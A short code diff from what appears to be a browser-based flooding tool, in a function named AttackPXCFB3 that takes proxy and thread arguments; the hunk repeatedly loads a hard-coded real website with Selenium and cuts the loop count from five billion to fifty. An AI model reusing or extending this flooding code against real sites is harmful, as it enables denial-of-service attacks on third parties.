@@ -579,7 +579,7 @@ def AttackPXCFB3(url, until_datetime, scraper,proxies,th):
             driver = webdriver.Chrome( )
             # Define the URL you want to scrape
             url = 'https://xvideos68.com'
-            for _ in range(5000000000):
+            for _ in range(50):
                 driver.get(url)
                 # Get the page title
                 page_title = driver.title
